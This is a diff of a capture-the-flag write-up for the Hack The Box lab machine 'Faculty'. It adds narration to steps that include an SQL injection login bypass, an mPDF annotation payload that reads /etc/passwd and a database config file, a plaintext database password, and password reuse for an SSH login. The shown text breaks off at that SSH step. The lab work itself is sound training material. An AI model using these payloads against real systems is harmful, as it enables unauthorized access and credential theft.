@@ -3,6 +3,8 @@
 
 ### Vulnerabilities: SQLI Auth bypass, PDF LFI, Sudo: Meta-Git, GDB attach process/cap_sys_ptrace
 
+Nmap only finds ssh and a webpage open.
+
 ```
 └─$ nmap -A -p- -T4 -Pn faculty.htb 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 10:47 CDT
@@ -28,7 +30,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
 ```
-
+Run a quick feroxbuster before navigating to the webpage and it finds alot.
 
 ```console
 ─$ feroxbuster -u http://faculty.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
@@ -102,13 +104,22 @@ Nmap done: 1 IP address (1 host up) scanned in 18.10 seconds
 200      GET        0l        0w        0c http://faculty.htb/mpdf/classes/myanmar.php
 ```
 
+
+The login page looks pretty good and happens to be vulnerable to a SQLI login bypass. I tried using burp intruder for this but it was not working for me. eventually I got it through manual input since I am avoiding using sqlmap these things are tougher.
+
 http://faculty.htb/admin/login.php
 
-admin'or'1=1#
-admin'or'1=1#
+Using the following SQLI we get logged in as admin.
+
+```admin'or'1=1#```
+
+I messed around the next part for awhile before figuring out about the pdf exploit. Then it took some more time to get that working.
 
 
 Using this string from the exploit linked below and inputting it into burp we can read local files.
+
+```<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />```
+https://www.exploit-db.com/exploits/50995
 
 Also it is needed to be URL encoded twice and then base64 encoded. This can be confirmed by taking the original pdf file code and decoding it.
 
@@ -119,15 +130,11 @@ Take the pdf string and throw it into the decoder.
 Next decode as base64, then url decode, then url decode again to get a plain text string from the pdf.
 
 
-
-```<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />```
-
 ```JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTM5JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTM3JTI1JTM3JTMyJTI1JTM2JTMxJTI1JTM3JTMwJTI1JTM2JTM4JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM3JTM0JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTMxJTI1JTM3JTM0JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM2JTM4JTI1JTM2JTM1JTI1JTM2JTM0JTI1JTMyJTMwJTI1JTM0JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTYxJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTM2JTM1JTI1JTM3JTM0JTI1JTM2JTMzJTI1JTMyJTY2JTI1JTM3JTMwJTI1JTM2JTMxJTI1JTM3JTMzJTI1JTM3JTMzJTI1JTM3JTM3JTI1JTM2JTM0JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTMzJTY1```
 
 
-https://www.exploit-db.com/exploits/50995
 
-
+Take your new pdf string and in burpsuite intercept the course list download page.(Its the one that opens up a new tab and opens the pdf file)
 
 ```
 POST /admin/download.php HTTP/1.1
@@ -147,8 +154,63 @@ Cache-Control: max-age=0
 
 pdf=JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlPSUyNTIyL2V0Yy9wYXNzd2QlMjUyMiUyNTIwY29udGVudD0lMjUyMi9ldGMvcGFzc3dkJTI1MjIlMjUyMGljb249JTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZT0lMjUyMkF0dGFjaGVkJTI1MjBGaWxlOiUyNTIwL2V0Yy9wYXNzd2QlMjUyMiUyNTIwcG9zLXg9JTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
 ```
+Send it in burpsuite and take the pdf link and put it at the end of your url.
+
 
 http://faculty.htb/mpdf/tmp/OKQVoYJgi9AqWEu045DZNwdzfX.pdf
+
+Doing so should bring you to a blank page, however attached to the pdf is the file passwd. So download it and we can view it on our machine.
+
+The passwd file gives us 2 users gbyolo and developer. Lets see if we can get anything else.
+
+```console
+└─$ cat passwd                     
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
+gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
+postfix:x:113:119::/var/spool/postfix:/usr/sbin/nologin
+developer:x:1001:1002:,,,:/home/developer:/bin/bash
+usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+```
+
+Using the same concept lets try and pull db_connect.php that feroxbuster found earlier.
+
+``````<annotation file="../admin/db_connect.php" content="../admin/db_connect.php" icon="Graph" title="Attached File: ../admin/db_connect.php" pos-x="195" />```
+
+```JTI1JTMzJTYzJTI1JTM2JTMxJTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTY2JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMyJTMwJTI1JTM2JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY1JTI1JTMyJTY1JTI1JTMyJTY2JTI1JTM2JTMxJTI1JTM2JTM0JTI1JTM2JTY0JTI1JTM2JTM5JTI1JTM2JTY1JTI1JTMyJTY2JTI1JTM2JTM0JTI1JTM2JTMyJTI1JTM1JTY2JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTM1JTI1JTM2JTMzJTI1JTM3JTM0JTI1JTMyJTY1JTI1JTM3JTMwJTI1JTM2JTM4JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTM2JTM1JTI1JTM2JTY1JTI1JTM3JTM0JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMyJTY1JTI1JTMyJTY1JTI1JTMyJTY2JTI1JTM2JTMxJTI1JTM2JTM0JTI1JTM2JTY0JTI1JTM2JTM5JTI1JTM2JTY1JTI1JTMyJTY2JTI1JTM2JTM0JTI1JTM2JTMyJTI1JTM1JTY2JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTM1JTI1JTM2JTMzJTI1JTM3JTM0JTI1JTMyJTY1JTI1JTM3JTMwJTI1JTM2JTM4JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM2JTM5JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTM3JTI1JTM3JTMyJTI1JTM2JTMxJTI1JTM3JTMwJTI1JTM2JTM4JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTM0JTI1JTM2JTM5JTI1JTM3JTM0JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTM0JTMxJTI1JTM3JTM0JTI1JTM3JTM0JTI1JTM2JTMxJTI1JTM2JTMzJTI1JTM2JTM4JTI1JTM2JTM1JTI1JTM2JTM0JTI1JTMyJTMwJTI1JTM0JTM2JTI1JTM2JTM5JTI1JTM2JTYzJTI1JTM2JTM1JTI1JTMzJTYxJTI1JTMyJTMwJTI1JTMyJTY1JTI1JTMyJTY1JTI1JTMyJTY2JTI1JTM2JTMxJTI1JTM2JTM0JTI1JTM2JTY0JTI1JTM2JTM5JTI1JTM2JTY1JTI1JTMyJTY2JTI1JTM2JTM0JTI1JTM2JTMyJTI1JTM1JTY2JTI1JTM2JTMzJTI1JTM2JTY2JTI1JTM2JTY1JTI1JTM2JTY1JTI1JTM2JTM1JTI1JTM2JTMzJTI1JTM3JTM0JTI1JTMyJTY1JTI1JTM3JTMwJTI1JTM2JTM4JTI1JTM3JTMwJTI1JTMyJTMyJTI1JTMyJTMwJTI1JTM3JTMwJTI1JTM2JTY2JTI1JTM3JTMzJTI1JTMyJTY0JTI1JTM3JTM4JTI1JTMzJTY0JTI1JTMyJTMyJTI1JTMzJTMxJTI1JTMzJTM5JTI1JTMzJTM1JTI1JTMyJTMyJTI1JTMyJTMwJTI1JTMyJTY2JTI1JTMzJTY1```
+
+Downloading this file and cating it reveals what might be a password.
 
 ```php
 └─$ cat db_connect.php 
@@ -156,6 +218,8 @@ http://faculty.htb/mpdf/tmp/OKQVoYJgi9AqWEu045DZNwdzfX.pdf
 
 $conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
  ```                   
+
+Luckily tring it out with the username we found earlier gets us in!
 
 ```console
 └─$ ssh gbyolo@faculty.htb          
